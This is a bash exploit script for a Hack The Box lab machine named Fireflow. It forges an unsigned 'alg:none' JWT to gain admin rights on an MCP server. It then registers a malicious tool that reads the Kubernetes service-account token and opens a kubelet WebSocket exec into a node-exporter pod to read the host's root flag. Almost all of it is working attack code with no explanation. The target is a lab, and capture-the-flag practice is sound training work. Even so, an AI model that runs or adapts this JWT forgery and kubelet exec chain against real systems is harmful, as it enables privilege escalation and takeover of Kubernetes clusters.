#!/usr/bin/env bash
# Fireflow HTB — v2: read the host root flag via MCP RCE and an allowed
# Kubernetes nodes/proxy WebSocket exec request. Run this *on fireflow* as
# nightfall; do not edit it after copying it to the target.
set -euo pipefail

REVISION='fireflow-root-v4-direct-kubelet-2026-10-04'
MCP_SERVER="${MCP_SERVER:-http://10.129.156.74:30080}"
MCP_USERNAME="${MCP_USERNAME:-langflow-bot}"
OUTPUT_DIR="${OUTPUT_DIR:-$HOME/loot/mcp}"

for dependency in curl jq python3; do
  command -v "$dependency" >/dev/null || {
    echo "Missing dependency: $dependency" >&2
    exit 1
  }
done

mkdir -p "$OUTPUT_DIR"
TOOL_NAME="nightfall_root_v2_$(date +%s)"
AUTH_FILE="$OUTPUT_DIR/auth-response.json"
REGISTER_FILE="$OUTPUT_DIR/${TOOL_NAME}-register.json"
INVOKE_FILE="$OUTPUT_DIR/${TOOL_NAME}-invoke-response.json"

echo "[+] Revision: $REVISION"
read -r -s -p "MCP password for ${MCP_USERNAME}: " MCP_PASSWORD
printf '\n'

echo "[+] Authenticating to $MCP_SERVER"
curl --fail-with-body -sS -X POST "$MCP_SERVER/api/v1/auth" \
  -H 'Content-Type: application/json' \
  --data "$(jq -nc --arg username "$MCP_USERNAME" --arg password "$MCP_PASSWORD" '{username:$username,password:$password}')" \
  -o "$AUTH_FILE"
unset MCP_PASSWORD

JWT="$(jq -r '.access_token // empty' "$AUTH_FILE")"
[[ -n "$JWT" ]] || { echo 'Authentication response had no access_token.' >&2; exit 1; }

# The registry accepts an unsigned JWT only because the lab intentionally
# supports alg:none.  The blank third segment is required.
ADMIN_TOKEN="$(python3 - "$JWT" <<'PY'
import base64, json, sys

def decode(value):
    return json.loads(base64.urlsafe_b64decode(value + '=' * (-len(value) % 4)))

def encode(value):
    raw = json.dumps(value, separators=(',', ':')).encode()
    return base64.urlsafe_b64encode(raw).rstrip(b'=').decode()

header, payload, _signature = sys.argv[1].split('.')
header = decode(header)
payload = decode(payload)
header['alg'] = 'none'
payload['role'] = 'admin'
print(f'{encode(header)}.{encode(payload)}.')
PY
)"

# This executes inside the mcp-server container. nodes/proxy GET authorizes the
# *direct* kubelet WebSocket handshake. Do not route it through kubernetes.default
# (the API-server proxy); that reintroduces the create nodes/proxy authorization
# check which this ServiceAccount does not have.
TOOL_CODE="import base64
import os
import socket
import ssl
import urllib.parse

SERVICE_ACCOUNT = '/var/run/secrets/kubernetes.io/serviceaccount'
token = open(SERVICE_ACCOUNT + '/token').read().strip()
# The kubelet certificate is node-local/self-signed. Authentication is by the
# bearer token, so a certificate-verifying context is not usable here.
context = ssl._create_unverified_context()

query = urllib.parse.urlencode([
    ('output', '1'),
    ('error', '1'),
    ('command', '/bin/sh'),
    ('command', '-c'),
    ('command', 'cat /host/root/root/root.txt'),
])
path = '/exec/monitoring/prometheus-prometheus-node-exporter-nmntq/node-exporter?' + query

raw = socket.create_connection(('10.129.156.74', 10250), timeout=10)
sock = context.wrap_socket(raw, server_hostname='fireflow')
websocket_key = base64.b64encode(os.urandom(16)).decode()
request = (
    'GET ' + path + ' HTTP/1.1\\r\\n'
    'Host: 10.129.156.74:10250\\r\\n'
    'Authorization: Bearer ' + token + '\\r\\n'
    'Connection: Upgrade\\r\\n'
    'Upgrade: websocket\\r\\n'
    'Sec-WebSocket-Version: 13\\r\\n'
    'Sec-WebSocket-Key: ' + websocket_key + '\\r\\n'
    'Sec-WebSocket-Protocol: v4.channel.k8s.io\\r\\n\\r\\n'
)
sock.sendall(request.encode())

buffer = b''
while b'\\r\\n\\r\\n' not in buffer:
    received = sock.recv(4096)
    if not received:
        break
    buffer += received

headers, _delimiter, buffer = buffer.partition(b'\\r\\n\\r\\n')
status_line = headers.split(b'\\r\\n', 1)[0]
if b' 101 ' not in status_line:
    # Preserve both response headers and body: a kubelet error is useful
    # feedback and must never be silently mistaken for a successful flag read.
    while True:
        received = sock.recv(4096)
        if not received:
            break
        buffer += received
    print('KUBELET_HTTP_RESPONSE:')
    print(headers.decode(errors='replace'))
    print(buffer.decode(errors='replace'))
    raise SystemExit(0)

def read_exact(length):
    global buffer
    while len(buffer) < length:
        received = sock.recv(4096)
        if not received:
            raise EOFError
        buffer += received
    result, buffer = buffer[:length], buffer[length:]
    return result

content = []
try:
    while True:
        first, second = read_exact(2)
        opcode = first & 0x0f
        length = second & 0x7f
        if length == 126:
            length = int.from_bytes(read_exact(2), 'big')
        elif length == 127:
            length = int.from_bytes(read_exact(8), 'big')
        payload = read_exact(length)
        if opcode == 0x8:
            break
        # Kubernetes v4.channel.k8s.io prefixes binary data with a channel:
        # 1=stdout, 2=stderr, 3=server-side error.
        if opcode in (0x1, 0x2) and payload and payload[0] in (1, 2, 3):
            content.append(payload[1:].decode(errors='replace'))
except EOFError:
    pass

print(''.join(content).strip())
"

jq -nc \
  --arg name "$TOOL_NAME" \
  --arg code "$TOOL_CODE" \
  '{name:$name,description:"HTB Fireflow one-shot root flag reader v2",inputSchema:{type:"object",properties:{}},code:$code}' \
  > "$REGISTER_FILE"

echo "[+] Registering $TOOL_NAME"
REGISTER_STATUS="$(curl -sS -o "$OUTPUT_DIR/${TOOL_NAME}-register-response.json" -w '%{http_code}' \
  -X POST "$MCP_SERVER/api/v1/tools" \
  -H "Authorization: Bearer $ADMIN_TOKEN" \
  -H 'Content-Type: application/json' \
  --data-binary @"$REGISTER_FILE")"
[[ "$REGISTER_STATUS" == '200' ]] || {
  echo "Tool registration failed (HTTP $REGISTER_STATUS):" >&2
  cat "$OUTPUT_DIR/${TOOL_NAME}-register-response.json" >&2
  exit 1
}

CALL="$(jq -nc --arg name "$TOOL_NAME" '{jsonrpc:"2.0",id:1,method:"tools/call",params:{name:$name,arguments:{}}}')"
echo '[+] Invoking the WebSocket exec reader'
curl --fail-with-body -sS -X POST "$MCP_SERVER/mcp" \
  -H "Authorization: Bearer $ADMIN_TOKEN" \
  -H 'Content-Type: application/json' \
  --data "$CALL" \
  -o "$INVOKE_FILE"

echo '[+] MCP response:'
jq . "$INVOKE_FILE"
echo "[+] Saved response: $INVOKE_FILE"
